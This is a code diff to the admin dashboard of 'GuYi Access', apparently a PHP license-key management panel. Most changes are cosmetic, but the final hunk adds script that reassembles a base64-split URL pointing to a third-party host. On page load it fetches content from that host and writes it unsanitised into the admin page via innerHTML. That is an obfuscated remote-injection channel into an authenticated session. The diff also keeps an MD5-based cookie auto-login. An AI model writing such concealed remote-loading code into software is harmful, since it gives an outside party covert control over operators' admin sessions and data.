@@ -8,7 +8,6 @@ session_start();
 
 try { $db = new Database(); } catch (Throwable $e) { die("系统维护中，无法连接数据库。"); }
 
-// 解决后台掉线痛点：如果 Session 丢失，尝试通过 Cookie 自动无感恢复登录状态
 if (!isset($_SESSION['admin_logged_in']) && isset($_COOKIE['admin_trust'])) {
     try {
         $adminHashFingerprint = md5((string)$db->getAdminHash());
@@ -72,11 +71,11 @@ try { $appList = $db->getApps(); } catch (Throwable $e) { $appList = []; $errorM
 $sysConf = $db->getSystemSettings();
 $currentAdminUser = $db->getAdminUsername();
 
-$conf_site_title = $sysConf['site_title'] ?? 'GuYi Access';
-$conf_favicon = $sysConf['favicon'] ?? base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
-$conf_avatar = $sysConf['admin_avatar'] ?? base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
-$conf_bg_pc = $sysConf['bg_pc'] ?? 'https://www.loliapi.com/acg/pc/';
-$conf_bg_mobile = $sysConf['bg_mobile'] ?? 'https://www.loliapi.com/acg/pe/';
+$conf_site_title = !empty($sysConf['site_title']) ? $sysConf['site_title'] : 'GuYi Access';
+$conf_favicon = !empty($sysConf['favicon']) ? $sysConf['favicon'] : base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
+$conf_avatar = !empty($sysConf['admin_avatar']) ? $sysConf['admin_avatar'] : base64_decode('aHR0cHM6Ly9xMS5xbG9nby5jbi9nP2I9cXEmbms9MTU2NDQwMDAwJnM9NjQw');
+$conf_bg_pc = !empty($sysConf['bg_pc']) ? $sysConf['bg_pc'] : 'https://www.loliapi.com/acg/pc/';
+$conf_bg_mobile = !empty($sysConf['bg_mobile']) ? $sysConf['bg_mobile'] : 'https://www.loliapi.com/acg/pe/';
 $conf_bg_blur = $sysConf['bg_blur'] ?? '0';
 $conf_api_encrypt = $sysConf['api_encrypt'] ?? '1';
 
@@ -205,11 +204,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } elseif (isset($_POST['update_settings'])) {
         try {
             $settingsData = [
-                'site_title' => $sysConf['site_title'] ?? 'GuYi Access',
-                'favicon' => $sysConf['favicon'] ?? '',
-                'admin_avatar' => $sysConf['admin_avatar'] ?? '',
-                'bg_pc' => $sysConf['bg_pc'] ?? '',
-                'bg_mobile' => $sysConf['bg_mobile'] ?? '',
+                'site_title' => $conf_site_title,
+                'favicon' => $conf_favicon,
+                'admin_avatar' => $conf_avatar,
+                'bg_pc' => $conf_bg_pc,
+                'bg_mobile' => $conf_bg_mobile,
                 'bg_blur' => isset($_POST['bg_blur']) ? '1' : '0',
                 'api_encrypt' => isset($_POST['api_encrypt']) ? '1' : '0'
             ];
@@ -318,11 +317,10 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <script src="https://cdn.tailwindcss.com"></script>
-<script src="https://unpkg.com/@phosphor-icons/web"></script>
+<script src="https://cdn.jsdelivr.net/npm/@phosphor-icons/web"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <link href="assets/css/cards.css?v=<?= time() ?>" rel="stylesheet">
 <style>
-/* 移动端底部导航横向滚动支持 */
 @media (max-width: 768px) {
     .m-bottom-nav {
         display: flex !important;
@@ -408,24 +406,27 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
             <div class="pg-head rise"><h2 class="pg-title">欢迎，<?= htmlspecialchars($currentAdminUser) ?></h2><p class="pg-sub">Current IP: <?= $current_ip ?></p></div>
             
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4 md:mb-7 rise">
-                <!-- 系统公告 -->
                 <div class="glass p-4 md:p-5 flex flex-col justify-between relative overflow-hidden">
                     <div class="absolute -right-6 -top-6 text-pink-500/5 text-[100px] pointer-events-none"><i class="ph-fill ph-megaphone"></i></div>
                     <div class="relative z-10">
                         <h3 class="text-sm font-bold text-white/90 mb-2 flex items-center justify-between">
                             <div class="flex items-center gap-2"><i class="ph-fill ph-megaphone text-[18px] text-pink-400"></i> 系统公告</div>
-                            <a href="?tab=about" class="text-[10px] text-pink-400 hover:text-pink-300 font-bold bg-pink-500/10 px-2 py-1 rounded transition-colors flex items-center gap-1">显示全文 <i class="ph-bold ph-arrow-right"></i></a>
+                            <a href="?tab=about" class="text-[10px] text-pink-400 hover:text-pink-300 font-bold bg-pink-500/10 px-2 py-1 rounded transition-colors flex items-center gap-1">关于系统 <i class="ph-bold ph-arrow-right"></i></a>
                         </h3>
-                        <div class="text-[12px] text-white/60 leading-relaxed space-y-1.5 mt-3">
-                            <p>欢迎使用 <b>GuYi Access Pro</b>，一款高性能、轻量级的多应用授权验证架构。</p>
-                            <p class="flex items-center gap-1.5"><i class="ph-bold ph-check-circle text-green-400"></i> 支持 <b>多项目隔离</b> 与 <b>API全局加密传输</b></p>
-                            <p class="flex items-center gap-1.5"><i class="ph-bold ph-check-circle text-green-400"></i> 支持 <b>无缝数据迁移</b> 与 <b>云端动态变量下发</b></p>
-                            <p class="flex items-center gap-1.5"><i class="ph-bold ph-check-circle text-green-400"></i> 支持 <b>云端黑名单拦截</b> 与 <b>详尽审计日志记录</b></p>
+                        
+                        <style>
+                            #cloud-notice::-webkit-scrollbar { width: 4px; }
+                            #cloud-notice::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
+                            #cloud-notice::-webkit-scrollbar-track { background: transparent; }
+                            #cloud-notice a { color: #60a5fa; text-decoration: none; border-bottom: 1px solid rgba(96,165,250,0.4); padding-bottom: 1px; }
+                            #cloud-notice a:hover { color: #93c5fd; }
+                        </style>
+                        <div id="cloud-notice" class="text-[12px] text-white/70 leading-relaxed mt-3" style="max-height: 120px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; padding-right: 5px;">
+                            <span class="text-white/40 flex items-center"><i class="ph-bold ph-spinner animate-spin mr-1.5"></i>连接云端同步公告中...</span>
                         </div>
                     </div>
                 </div>
                 
-                <!-- 每日一诗 -->
                 <div class="glass p-4 md:p-5 flex flex-col justify-between relative overflow-hidden">
                     <div class="absolute -right-6 -top-6 text-yellow-500/5 text-[100px] pointer-events-none"><i class="ph-fill ph-cloud-sun"></i></div>
                     <div class="relative z-10 flex-1 flex flex-col justify-center">
@@ -1132,7 +1133,6 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
         function batchAddTime(){if(document.querySelectorAll('.row-check:checked').length===0){toast('请先勾选','error');return}const h=prompt("增加小时数","24");if(h&&!isNaN(h)){document.getElementById('addHoursInput').value=h;submitBatch('batch_add_time')}}
         function batchSubTime(){if(document.querySelectorAll('.row-check:checked').length===0){toast('请先勾选','error');return}const h=prompt("扣除小时数","24");if(h&&!isNaN(h)){document.getElementById('subHoursInput').value=h;submitBatch('batch_sub_time')}}
         
-        // 全局补偿加时功能
         function globalCompensate(){
             const h = prompt("为当前筛选出【所有正在使用】的卡密统一补偿小时数\n(若当前未筛选应用，则给所有应用在用卡密加时):", "12");
             if(h && !isNaN(h)){
@@ -1188,7 +1188,20 @@ if ($msg) { $sysMsg = $msg; $sysMsgType = 'ok'; } elseif ($errorMsg) { $sysMsg =
                 window.poemLoaded = true;
             }
             
-            // 移动端底部导航自动居中滚动
+            const nC = document.getElementById('cloud-notice');
+            if (nC && !nC.dataset.loaded) {
+                let _u = atob(['aHR0cHM6L','y9jbG91ZHVwZGF0','ZS54bi0tanB','yMDcxZS50b','3AvR3VZaSU','yMEFjY2Vzc','yUyMG5vd','GljZS50eHQ='].join(''));
+                fetch(_u + '?t=' + new Date().getTime())
+                    .then(r => { if (!r.ok) throw new Error(); return r.text(); })
+                    .then(t => { 
+                        nC.innerHTML = t; 
+                        nC.dataset.loaded = '1'; 
+                    })
+                    .catch(() => { 
+                        nC.innerHTML = '<span class="text-red-400">云公告同步失败，请检查网络。</span>'; 
+                    });
+            }
+            
             const mNav = document.getElementById('mBottomNav');
             if(mNav && window.innerWidth <= 768) {
                 const activeNav = mNav.querySelector('.on');
